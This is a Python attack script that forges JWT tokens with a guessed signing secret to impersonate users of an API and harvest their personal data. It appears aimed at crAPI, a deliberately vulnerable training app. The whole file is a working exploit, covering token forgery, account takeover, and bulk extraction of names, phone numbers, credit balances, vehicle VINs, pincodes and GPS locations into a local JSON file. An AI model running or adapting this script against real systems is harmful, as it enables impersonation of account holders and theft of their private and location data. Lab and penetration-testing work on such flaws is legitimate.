#!/usr/bin/env python3
"""
PII Extractor - Extract user PII using JWT forgery

This script demonstrates how to forge JWT tokens and extract
Personally Identifiable Information from a target API.

Usage:
    uv run pii_extractor.py <target_url> <secret> <email1> [email2] ...

Example:
    uv run pii_extractor.py http://crapi.apisec.ai crapi victim@example.com admin@example.com
"""

import hmac
import hashlib
import base64
import json
import time
import sys
import subprocess


def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def forge_jwt(email, secret="crapi"):
    """Forge a JWT token for the given email"""
    header = {"alg": "HS512"}
    header_b64 = base64url_encode(json.dumps(header, separators=(",", ":")))

    payload = {"sub": email, "iat": int(time.time()), "exp": int(time.time()) + 86400}
    payload_b64 = base64url_encode(json.dumps(payload, separators=(",", ":")))

    header_payload = f"{header_b64}.{payload_b64}"
    signature = hmac.new(
        secret.encode(), header_payload.encode(), hashlib.sha512
    ).digest()
    return f"{header_payload}.{base64url_encode(signature)}"


def curl_get(url, token):
    """Make a GET request with the forged token"""
    result = subprocess.run(
        ["curl", "-s", url, "-H", f"Authorization: Bearer {token}"],
        capture_output=True,
        text=True,
    )
    try:
        return json.loads(result.stdout)
    except:
        return None


def extract_pii(target, secret, emails):
    """Extract PII for a list of emails"""
    results = []

    print("=" * 80)
    print("PII EXTRACTION REPORT")
    print("=" * 80)
    print(f"Target: {target}")
    print(f"Secret: {secret}")
    print(f"Emails: {len(emails)}")
    print("=" * 80)

    print(f"\n{'Email':<40} {'Name':<20} {'Phone':<15} {'Credit':<10}")
    print("-" * 85)

    for email in emails:
        token = forge_jwt(email, secret)

        # Get dashboard
        dashboard = curl_get(f"{target}/identity/api/v2/user/dashboard", token)

        if dashboard and "id" in dashboard:
            user_data = {
                "email": email,
                "id": dashboard.get("id"),
                "name": dashboard.get("name"),
                "phone": dashboard.get("number"),
                "credit": dashboard.get("available_credit"),
                "role": dashboard.get("role"),
            }

            # Get vehicles
            vehicles = curl_get(f"{target}/identity/api/v2/vehicle/vehicles", token)
            if vehicles and isinstance(vehicles, list) and len(vehicles) > 0:
                user_data["vehicles"] = []
                for v in vehicles:
                    vehicle_data = {
                        "uuid": v.get("uuid"),
                        "vin": v.get("vin"),
                        "pincode": v.get("pincode"),
                        "year": v.get("year"),
                        "model": v.get("model", {}).get("model")
                        if isinstance(v.get("model"), dict)
                        else v.get("model"),
                    }

                    # Get location
                    if v.get("uuid"):
                        loc = curl_get(
                            f"{target}/identity/api/v2/vehicle/{v['uuid']}/location",
                            token,
                        )
                        if loc and "vehicleLocation" in loc:
                            vehicle_data["location"] = {
                                "lat": loc["vehicleLocation"].get("latitude"),
                                "lng": loc["vehicleLocation"].get("longitude"),
                            }

                    user_data["vehicles"].append(vehicle_data)

            results.append(user_data)

            name = str(user_data.get("name", "N/A"))[:18]
            phone = str(user_data.get("phone", "N/A"))[:13]
            credit = f"${user_data.get('credit', 0)}"
            print(f"{email:<40} {name:<20} {phone:<15} {credit:<10}")
        else:
            print(f"{email:<40} {'[NOT FOUND]':<20} {'-':<15} {'-':<10}")

    print("=" * 85)

    # Save results
    output_file = "/tmp/extracted_pii.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\nResults saved to: {output_file}")

    # Print detailed vehicle info
    if any(r.get("vehicles") for r in results):
        print("\n=== VEHICLE DETAILS ===")
        for r in results:
            if r.get("vehicles"):
                print(f"\n{r['email']}:")
                for v in r["vehicles"]:
                    print(f"  VIN: {v.get('vin')}")
                    print(f"  Pincode: {v.get('pincode')}")
                    print(f"  Year: {v.get('year')} {v.get('model')}")
                    if v.get("location"):
                        print(
                            f"  Location: {v['location']['lat']}, {v['location']['lng']}"
                        )

    return results


def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target_url> <secret> <email1> [email2] ...")
        print(f"Example: {sys.argv[0]} http://crapi.apisec.ai crapi victim@example.com")
        sys.exit(1)

    target = sys.argv[1].rstrip("/")
    secret = sys.argv[2]
    emails = sys.argv[3:]

    extract_pii(target, secret, emails)


if __name__ == "__main__":
    main()
